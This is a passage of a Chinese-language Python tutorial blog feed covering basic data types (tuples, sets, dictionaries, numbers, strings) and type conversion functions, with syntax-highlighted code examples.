string">'runoob'</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token string">'runoob'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'abcd'</span><span class="token punctuation">,</span> <span class="token number">786</span><span class="token punctuation">,</span> <span class="token number">2.23</span><span class="token punctuation">,</span> <span class="token string">'runoob'</span><span class="token punctuation">,</span> <span class="token number">70.2</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token string">'runoob'</span><span class="token punctuation">)</span></code></pre><p>元组与字符串类似，可以被索引且下标索引从0开始，-1 为从末尾开始的位置。也可以进行截取（看上面，这里不再赘述）。</p><p>其实，可以把字符串看作一种特殊的元组。 </p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#实例</span><span class="token operator">>></span><span class="token operator">></span>tup <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>tup<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token number">1</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>tup<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> tup<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">11</span>  <span class="token comment" spellcheck="true"># 修改元组元素的操作是非法的</span>Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>  File <span class="token string">"&lt;stdin>"</span><span class="token punctuation">,</span> line <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>TypeError<span class="token punctuation">:</span> <span class="token string">'tuple'</span> object does <span class="token operator">not</span> support item assignment</code></pre><p>虽然tuple的元素不可改变，但它可以包含可变的对象，比如list列表。 </p><p> 构造包含 0 个或 1 个元素的元组比较特殊，所以有一些额外的语法规则： </p><pre class=" language-python"><code class="language-python">tup1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 空元组</span>tup2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 一个元素，需要在元素后添加逗号</span></code></pre><p>string、list 和 tuple 都属于 sequence（序列）。</p><p><strong>注意：</strong></p><ul><li><strong>1、与字符串一样，元组的元素不能修改。</strong></li><li><strong>2、元组也可以被索引和切片，方法一样。</strong></li><li>3、注意构造包含 0 或 1 个元素的元组的特殊语法规则。</li><li>4、元组也可以使用+操作符进行拼接。</li></ul><h4 id="Set（集合）"><a href="#Set（集合）" class="headerlink" title="Set（集合）"></a>Set（集合）</h4><p> 集合（set）是由一个或数个形态各异的大小整体组成的，构成集合的事物或对象称作元素或是成员。</p><p><code>基本功能是进行成员关系测试和删除重复元素。可以使用大括号 { } 或者 set() 函数创建集合，</code></p><p><strong>注意：创建一个空集合必须用 set() 而不是 { }，因为 { } 是用来创建一个空字典。</strong> </p><blockquote><p><strong>创建格式：</strong></p><p><strong>parame = {value01,value02,…}或者set(value)</strong></p></blockquote><pre class=" language-python"><code class="language-python">student <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Tom'</span><span class="token punctuation">,</span> <span class="token string">'Jim'</span><span class="token punctuation">,</span> <span class="token string">'Mary'</span><span class="token punctuation">,</span> <span class="token string">'Tom'</span><span class="token punctuation">,</span> <span class="token string">'Jack'</span><span class="token punctuation">,</span> <span class="token string">'Rose'</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span>student<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># 输出集合，重复的元素被自动去掉</span><span class="token comment" spellcheck="true"># 成员测试</span><span class="token keyword">if</span> <span class="token string">'Rose'</span> <span class="token keyword">in</span> student <span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Rose 在集合中'</span><span class="token punctuation">)</span><span class="token keyword">else</span> <span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Rose 不在集合中'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># set可以进行集合运算</span>a <span class="token operator">=</span> set<span class="token punctuation">(</span><span class="token string">'abracadabra'</span><span class="token punctuation">)</span>b <span class="token operator">=</span> set<span class="token punctuation">(</span><span class="token string">'alacazam'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">-</span> b<span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># a 和 b 的差集 </span><span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">|</span> b<span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># a 和 b 的并集 </span><span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">&amp;</span> b<span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># a 和 b 的交集</span><span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">^</span> b<span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># a 和 b 中不同时存在的元素</span></code></pre><p>以上实例输出结果：</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">{</span><span class="token string">'Mary'</span><span class="token punctuation">,</span> <span class="token string">'Jim'</span><span class="token punctuation">,</span> <span class="token string">'Rose'</span><span class="token punctuation">,</span> <span class="token string">'Jack'</span><span class="token punctuation">,</span> <span class="token string">'Tom'</span><span class="token punctuation">}</span>Rose 在集合中<span class="token punctuation">{</span><span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'z'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'z'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">}</span></code></pre><h4 id="Dictionary（字典）"><a href="#Dictionary（字典）" class="headerlink" title="Dictionary（字典）"></a>Dictionary（字典）</h4><p> 字典（dictionary）是Python中另一个非常有用的内置数据类型。</p><p>列表是有序的对象集合，字典是无序的对象集合。两者之间的区别在于：字典当中的元素是通过键来存取的，而不是通过偏移存取。</p><p>字典是一种映射类型，字典用 { } 标识，它是一个无序的 <strong>键(key) : 值(value)</strong> 的集合。</p><p>键(key)必须使用不可变类型。在同一个字典中，键(key)必须是唯一的。 </p><pre class=" language-python"><code class="language-python">dict <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>dict<span class="token punctuation">[</span><span class="token string">'one'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"1 - lu-sakura"</span>dict<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>     <span class="token operator">=</span> <span class="token string">"2 - lu-sakura"</span>tinydict <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'runoob'</span><span class="token punctuation">,</span><span class="token string">'code'</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'site'</span><span class="token punctuation">:</span> <span class="token string">'www.runoob.com'</span><span class="token punctuation">}</span><span class="token keyword">print</span> <span class="token punctuation">(</span>dict<span class="token punctuation">[</span><span class="token string">'one'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># 输出键为 'one' 的值</span><span class="token keyword">print</span> <span class="token punctuation">(</span>dict<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>           <span class="token comment" spellcheck="true"># 输出键为 2 的值</span><span class="token keyword">print</span> <span class="token punctuation">(</span>tinydict<span class="token punctuation">)</span>          <span class="token comment" spellcheck="true"># 输出完整的字典</span><span class="token keyword">print</span> <span class="token punctuation">(</span>tinydict<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># 输出所有键</span><span class="token keyword">print</span> <span class="token punctuation">(</span>tinydict<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 输出所有值</span></code></pre><p>以上实例输出结果：</p><pre class=" language-python"><code class="language-python"><span class="token number">1</span> <span class="token operator">-</span> lu<span class="token operator">-</span>sakura<span class="token number">2</span> <span class="token operator">-</span> lu<span class="token operator">-</span>sakura<span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'runoob'</span><span class="token punctuation">,</span> <span class="token string">'code'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'site'</span><span class="token punctuation">:</span> <span class="token string">'www.runoob.com'</span><span class="token punctuation">}</span>dict_keys<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'code'</span><span class="token punctuation">,</span> <span class="token string">'site'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>dict_values<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'runoob'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'www.runoob.com'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>构造函数 dict() 可以直接从键值对序列中构建字典如下：</p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span>dict<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'Taobao'</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token string">'Taobao'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'Google'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">{</span>x<span class="token punctuation">:</span> x<span class="token operator">**</span><span class="token number">2</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token number">2</span><span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">:</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">:</span> <span class="token number">36</span><span class="token punctuation">}</span><span class="token operator">>></span><span class="token operator">></span> dict<span class="token punctuation">(</span>Runoob<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> Google<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> Taobao<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token string">'Runoob'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'Google'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">}</span></code></pre><p>另外，字典类型也有一些内置的函数，例如clear()、keys()、values()等。</p><p><strong>注意：</strong></p><ul><li>1、字典是一种映射类型，它的元素是键值对。</li><li><strong>2、字典的关键字必须为不可变类型，且不能重复。</strong></li><li>3、创建空字典使用 <strong>{ }</strong>。</li></ul><h4 id="Python数据类型转换"><a href="#Python数据类型转换" class="headerlink" title="Python数据类型转换"></a>Python数据类型转换</h4><p> 有时候，我们需要对数据内置的类型进行转换，数据类型的转换，你只需要将数据类型作为函数名即可。</p><p> 以下几个内置的函数可以执行数据类型之间的转换。这些函数返回一个新的对象，表示转换的值。</p><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>int(x,base])</td><td>将x转换为一个整数</td></tr><tr><td>float(x)</td><td>将x转换到一个浮点数</td></tr><tr><td>complex(real [,imag])</td><td>创建一个复数</td></tr><tr><td><a href="https://www.runoob.com/python3/python-func-str.html" target="_blank" rel="noopener">str(x)</a></td><td>将对象 x 转换为字符串</td></tr><tr><td><a href="https://www.runoob.com/python3/python-func-repr.html" target="_blank" rel="noopener">repr(x)</a></td><td>将对象 x 转换为表达式字符串</td></tr><tr><td><a href="https://www.runoob.com/python3/python-func-eval.html" target="_blank" rel="noopener">eval(str)</a></td><td>用来计算在字符串中的有效Python表达式,并返回一个对象</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-tuple.html" target="_blank" rel="noopener">tuple(s)</a></td><td>将序列 s 转换为一个元组</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-att-list-list.html" target="_blank" rel="noopener">list(s)</a></td><td>将序列 s 转换为一个列表</td></tr><tr><td><a href="https://www.runoob.com/python3/python-func-set.html" target="_blank" rel="noopener">set(s)</a></td><td>转换为可变集合</td></tr><tr><td><a href="https://www.runoob.com/python3/python-func-dict.html" target="_blank" rel="noopener">dict(d)</a></td><td>创建一个字典。d 必须是一个 (key, value)元组序列。</td></tr><tr><td><a href="https://www.runoob.com/python3/python-func-frozenset.html" target="_blank" rel="noopener">frozenset(s)</a></td><td>转换为不可变集合</td></tr><tr><td><a href="https://www.runoob.com/python3/python-func-chr.html" target="_blank" rel="noopener">chr(x)</a></td><td>将一个整数转换为一个字符</td></tr><tr><td><a href="https://www.runoob.com/python3/python-func-ord.html" target="_blank" rel="noopener">ord(x)</a></td><td>将一个字符转换为它的整数值</td></tr><tr><td><a href="https://www.runoob.com/python3/python-func-hex.html" target="_blank" rel="noopener">hex(x)</a></td><td>将一个整数转换为一个十六进制字符串</td></tr><tr><td><a href="https://www.runoob.com/python3/python-func-oct.html" target="_blank" rel="noopener">oct(x)</a></td><td>将一个整数转换为一个八进制字</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python初识</title>
      <link href="/2020/01/15/python-chu-shi-er/"/>
      <url>/2020/01/15/python-chu-shi-er/</url>
      
        <content type="html"><![CDATA[<h1 id="python初识（二）"><a href="#python初识（二）" class="headerlink" title="python初识（二）"></a>python初识（二）</h1><h2 id="python基础"><a href="#python基础" class="headerlink" title="python基础"></a>python基础</h2><h3 id="python基本数据类型"><a href="#python基本数据类型" class="headerlink" title="python基本数据类型"></a>python基本数据类型</h3><p>==<strong>Python 中的变量不需要声明。每个变量在使用前都必须赋值，变量赋值以后该变量才会被创建。</strong>==</p><p>在 Python 中，变量就是变量，它没有类型，我们所说的”类型”是变量所指的内存中对象的类型。</p><p>等号（=）用来给变量赋值。</p><p>等号（=）运算符左边是一个变量名,等号（=）运算符右边是存储在变量中的值。</p><pre class=" language-python"><code class="language-python">counter <span class="token operator">=</span> <span class="token number">100</span>          <span class="token comment" spellcheck="true"># 整型变量</span>miles   <span class="token operator">=</span> <span class="token number">1000.0</span>       <span class="token comment" spellcheck="true"># 浮点型变量</span>name    <span class="token operator">=</span> <span class="token string">"runoob"</span>     <span class="token comment" spellcheck="true"># 字符串</span><span class="token keyword">print</span> <span class="token punctuation">(</span>counter<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>miles<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#输出结果</span><span class="token number">100</span><span class="token number">1000.0</span>runoob</code></pre><h4 id="多个变量赋值"><a href="#多个变量赋值" class="headerlink" title="多个变量赋值"></a>多个变量赋值</h4><p>Python允许你同时为多个变量赋值。例如：</p><pre class=" language-python"><code class="language-python">a <span class="token operator">=</span> b <span class="token operator">=</span> c <span class="token operator">=</span> <span class="token number">1</span></code></pre><p> 以上实例，创建一个整型对象，值为 1，从后向前赋值，三个变量被赋予相同的数值。 </p><p> 您也可以为多个对象指定多个变量。例如：</p><pre class=" language-python"><code class="language-python">a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"runoob"</span></code></pre><p>以上实例，两个整型对象 1 和 2 的分配给变量 a 和 b，字符串对象 “runoob” 分配给变量 c。</p><h4 id="标准数据类型"><a href="#标准数据类型" class="headerlink" title="标准数据类型"></a>标准数据类型</h4><p>Python3 中有六个标准的数据类型： </p><ul><li><strong>Number（数字）</strong></li><li><strong>String（字符串）</strong></li><li><strong>List（列表）</strong></li><li><strong>Tuple（元组）</strong></li><li><strong>Set（集合）</strong></li><li><strong>Dictionary（字典）</strong></li></ul><p>Python3 的六个标准数据类型中：</p><ul><li><strong>不可变数据（3 个）：</strong>Number（数字）、String（字符串）、Tuple（元组）；</li><li><strong>可变数据（3 个）：</strong>List（列表）、Dictionary（字典）、Set（集合）。 </li></ul><h3 id="Number（数字）"><a href="#Number（数字）" class="headerlink" title="Number（数字）"></a>Number（数字）</h3><p>Python3 支持 <strong>int、float、bool、complex（复数）</strong>。 </p><p>在Python 3里，只有一种整数类型 int，表示为长整型，没有 python2 中的 Long。</p><p>像大多数语言一样，数值类型的赋值和计算都是很直观的。</p><p>内置的 type() 函数可以用来查询变量所指的对象类型。</p><pre class=" language-python"><code class="language-python">a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">5.5</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token operator">+</span><span class="token number">3j</span><span class="token keyword">print</span><span class="token punctuation">(</span>type<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span> type<span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">,</span> type<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span> type<span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#运行结果</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'int'</span><span class="token operator">></span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'float'</span><span class="token operator">></span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'bool'</span><span class="token operator">></span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'complex'</span><span class="token operator">></span></code></pre><p>此外还可以用 isinstance 来判断：</p><pre class=" language-python"><code class="language-python">a <span class="token operator">=</span> <span class="token number">111</span>isinstance<span class="token punctuation">(</span>a<span class="token punctuation">,</span> int<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#运行结果</span><span class="token boolean">True</span></code></pre><p> isinstance 和 type 的区别在于：</p><ul><li><p>type()不会认为子类是一种父类类型。</p></li><li><p>isinstance()会认为子类是一种父类类型。</p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">pass</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">pass</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token operator">>></span><span class="token operator">></span> isinstance<span class="token punctuation">(</span>A<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> A<span class="token punctuation">)</span><span class="token boolean">True</span><span class="token operator">>></span><span class="token operator">></span> type<span class="token punctuation">(</span>A<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> A <span class="token boolean">True</span><span class="token operator">>></span><span class="token operator">></span> isinstance<span class="token punctuation">(</span>B<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> A<span class="token punctuation">)</span><span class="token boolean">True</span><span class="token operator">>></span><span class="token operator">></span> type<span class="token punctuation">(</span>B<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> A<span class="token boolean">False</span></code></pre></li></ul><blockquote><p><strong>注意：</strong>在 Python2 中是没有布尔型的，它用数字 0 表示 False，用 1 表示 True。到 Python3 中，把 True 和 False 定义成关键字了，但它们的值还是 1 和 0，它们可以和数字相加。</p></blockquote><h3 id="数值运算"><a href="#数值运算" class="headerlink" title="数值运算"></a>数值运算</h3><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span><span class="token number">5</span> <span class="token operator">+</span> <span class="token number">4</span>  <span class="token comment" spellcheck="true"># 加法</span><span class="token number">9</span><span class="token operator">>></span><span class="token operator">></span> <span class="token number">4.3</span> <span class="token operator">-</span> <span class="token number">2</span> <span class="token comment" spellcheck="true"># 减法</span><span class="token number">2.3</span><span class="token operator">>></span><span class="token operator">></span> <span class="token number">3</span> <span class="token operator">*</span> <span class="token number">7</span>  <span class="token comment" spellcheck="true"># 乘法</span><span class="token number">21</span><span class="token operator">>></span><span class="token operator">></span> <span class="token number">2</span> <span class="token operator">/</span> <span class="token number">4</span>  <span class="token comment" spellcheck="true"># 除法，得到一个浮点数</span><span class="token number">0.5</span><span class="token operator">>></span><span class="token operator">></span> <span class="token number">2</span> <span class="token operator">//</span> <span class="token number">4</span> <span class="token comment" spellcheck="true"># 除法，得到一个整数</span><span class="token number">0</span><span class="token operator">>></span><span class="token operator">></span> <span class="token number">17</span> <span class="token operator">%</span> <span class="token number">3</span> <span class="token comment" spellcheck="true"># 取余 </span><span class="token number">2</span><span class="token operator">>></span><span class="token operator">></span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">5</span> <span class="token comment" spellcheck="true"># 乘方</span><span class="token number">32</span></code></pre><p><strong>注意：</strong></p><ul><li>1、Python可以同时为多个变量赋值，如a, b = 1, 2。</li><li>2、一个变量可以通过赋值指向不同类型的对象。</li><li><strong>3、数值的除法包含两个运算符：/ 返回一个浮点数，// 返回一个整数。</strong></li><li>4、在混合计算时，Python会把整型转换成为浮点数。 </li></ul><h3 id="数值类型实例"><a href="#数值类型实例" class="headerlink" title="数值类型实例"></a>数值类型实例</h3><table><thead><tr><th>t</th><th>float</th><th>complex</th></tr></thead><tbody><tr><td>10</td><td>0.0</td><td>3.14j</td></tr><tr><td>100</td><td>15.20</td><td>45.j</td></tr><tr><td>-786</td><td>-21.9</td><td>9.322e-36j</td></tr><tr><td>080</td><td>32.3e+18</td><td>.876j</td></tr><tr><td>-0490</td><td>-90.</td><td>-.6545+0J</td></tr><tr><td>-0x260</td><td>-32.54e100</td><td>3e+26J</td></tr><tr><td>0x69</td><td>70.2E-12</td><td>4.53e-7j</td></tr></tbody></table><p><strong>Python还支持复数，复数由实数部分和虚数部分构成，可以用a + bj,或者complex(a,b)表示， 复数的实部a和虚部b都是浮点型</strong></p><h3 id="String（字符串）"><a href="#String（字符串）" class="headerlink" title="String（字符串）"></a>String（字符串）</h3><p>Python中的字符串用单引号 ‘ 或双引号 “ 括起来，同时使用反斜杠 \ 转义特殊字符。</p><p>字符串的截取的语法格式如下：</p><blockquote><p><strong>变量[头下标:尾下标]</strong></p></blockquote><p>索引<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img">值以 0 为开始值，-1 为从末尾的开始位置。</p><p><img src="/2020/01/15/python-chu-shi-er/picgo-github20200114203047.png" alt="img"></p><p>加号  <code>+</code> 是字符串的连接符， 星号 <code>*</code>表示复制当前字符串，紧跟的数字为复制的次数。实例如下：</p><pre class=" language-python"><code class="language-python">str <span class="token operator">=</span> <span class="token string">'Runoob'</span><span class="token keyword">print</span> <span class="token punctuation">(</span>str<span class="token punctuation">)</span>          <span class="token comment" spellcheck="true"># 输出字符串</span><span class="token keyword">print</span> <span class="token punctuation">(</span>str<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 输出第一个到倒数第二个的所有字符</span><span class="token keyword">print</span> <span class="token punctuation">(</span>str<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># 输出字符串第一个字符</span><span class="token keyword">print</span> <span class="token punctuation">(</span>str<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># 输出从第三个开始到第五个的字符</span><span class="token keyword">print</span> <span class="token punctuation">(</span>str<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true"># 输出从第三个开始的后的所有字符</span><span class="token keyword">print</span> <span class="token punctuation">(</span>str <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true"># 输出字符串两次</span><span class="token keyword">print</span> <span class="token punctuation">(</span>str <span class="token operator">+</span> <span class="token string">"TEST"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 连接字符串</span><span class="token comment" spellcheck="true">#输出结果</span>RunoobRunooRnoonoobRunoobRunoobRunoobTEST</code></pre><p>Python 使用反斜杠(\)转义特殊字符，如果你不想让反斜杠发生转义，可以在字符串前面添加一个 r，表示原始字符串：</p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Ru\noob'</span><span class="token punctuation">)</span>Ruoob<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token string">'Ru\noob'</span><span class="token punctuation">)</span>Ru\noob<span class="token operator">>></span><span class="token operator">></span> </code></pre><p> 另外，反斜杠()可以作为续行符，表示下一行是上一行的延续。也可以使用 <strong>“””…”””</strong> 或者 <strong>‘’’…’’’</strong> 跨越多行。 </p><p>注意，Python 没有单独的字符类型，一个字符就是长度为1的字符串。 </p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span>word <span class="token operator">=</span> <span class="token string">'Python'</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>word<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> word<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span>P n<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>word<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> word<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span>n P</code></pre><p>与 C 字符串不同的是，Python 字符串不能被改变。向一个索引位置赋值，比如word[0] = ‘m’会导致错误。 </p><p> 